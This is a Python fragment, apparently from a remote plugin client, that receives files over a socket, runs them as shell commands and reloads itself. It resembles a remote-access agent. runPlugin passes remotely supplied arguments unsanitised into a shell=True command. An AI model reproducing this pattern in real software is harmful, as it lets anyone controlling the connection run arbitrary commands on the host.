def sendPlugin(client):
    print('指令为接收一个插件')
    try:
        client.recvFile()
        return {'status':'SUCCESS'}
    except Exception as err:
        return {'status':'FAILED','error':str(err)}

def runPlugin(client):
    print('指令为运行一个插件')
    try:
        ret=subprocess.run(f'.\plugins\{plugin_parser[client.cur_args[0]]["dir"]} {client.cur_args[1:]}',shell=True)
        return {'status':'SUCCESS'}
    except KeyError as err:
        return {'status':'FAILED','error':'插件不存在或配置信息未同步！'}

def reload(client):
    print('开始重载客户端...')
    client.SOCKET.close()
    if hasattr(sys, 'frozen'):
        cmd=os.path.abspath(sys.executable)
    else:
        cmd='python '+os.path.abspath(__file__)
    subprocess.run(cmd,shell=True)
    sys.exit(0)

def syncPlugins(client):
    try:
        plugin_count=int(base64.b64decode(client.SOCKET.recv(1024)).decode(encoding='utf-8'))
        for i in range(plugin_count):
            client.recvFile()
            message=base64.b64encode('Data Received'.encode(encoding='utf-8'))
            client.SOCKET.sendall(message)
        client.recvFile()
        return {'status':'SUCCESS'}
    except Exception as err:
        print(err)
        return {'status':'FAILED','error':str(err)}
